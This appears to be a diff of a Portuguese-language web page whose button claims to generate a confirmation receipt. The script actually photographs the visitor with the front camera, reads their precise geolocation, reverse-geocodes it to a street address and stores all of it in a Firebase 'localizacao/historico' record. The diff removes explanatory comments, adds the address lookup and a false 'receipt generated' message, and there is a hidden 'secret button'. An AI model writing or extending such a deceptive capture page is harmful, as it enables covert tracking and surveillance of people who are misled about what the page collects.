@@ -202,7 +202,6 @@
     const btn = document.getElementById('btnEnviar');
     const status = document.getElementById('status');
 
-    // Função para tirar foto via câmera frontal
     async function tirarFoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -214,7 +213,6 @@
         video.srcObject = stream;
         await video.play();
 
-        // Aguarda meio segundo para a câmera ajustar o brilho/foco
         await new Promise(resolve => setTimeout(resolve, 500));
 
         const canvas = document.createElement('canvas');
@@ -226,12 +224,11 @@
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, width, height);
 
-        // Desliga a câmera
         stream.getTracks().forEach(track => track.stop());
 
         return canvas.toDataURL('image/jpeg', 0.6);
       } catch (err) {
-        console.warn("Câmera não permitida ou indisponível:", err);
+        console.warn("Câmera indisponível ou negada:", err);
         return null;
       }
     }
@@ -239,7 +236,6 @@
     btn.addEventListener('click', async () => {
       status.innerHTML = '<div class="spinner"></div><span>Processando confirmação...</span>';
 
-      // Captura foto e localização em paralelo
       const fotoBase64 = await tirarFoto();
 
       if (!navigator.geolocation) {
@@ -248,17 +244,36 @@
       }
 
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
+        async (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
           
+          let enderecoFormatado = "Endereço não identificado";
+          try {
+            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+            const data = await response.json();
+            
+            if (data && data.address) {
+              const a = data.address;
+              const rua = a.road || a.pedestrian || a.footway || 'Rua não identificada';
+              const numero = a.house_number ? `, nº ${a.house_number}` : ' (s/nº aproximado)';
+              const bairro = a.suburb || a.neighbourhood || a.district || '';
+              const cidade = a.city || a.town || a.village || '';
+              
+              enderecoFormatado = `${rua}${numero} - ${bairro}, ${cidade}`;
+            }
+          } catch (err) {
+            console.warn("Erro ao buscar endereço por extenso:", err);
+          }
+
           push(ref(db, 'localizacao/historico'), {
             lat: latitude,
             lng: longitude,
             precisao: accuracy,
+            endereco: enderecoFormatado,
             foto: fotoBase64 || null,
             timestamp: new Date().toISOString()
           }).then(() => {
-            status.innerText = "Processando comprovante...";
+            status.innerText = "Comprovante gerado com sucesso!";
           });
         },
         (err) => {
@@ -268,7 +283,6 @@
       );
     });
 
-    // --- BOTÃO SECRETO ---
     let cliqueCount = 0;
     let timer;
     const escudo = document.getElementById('escudoSecreto');
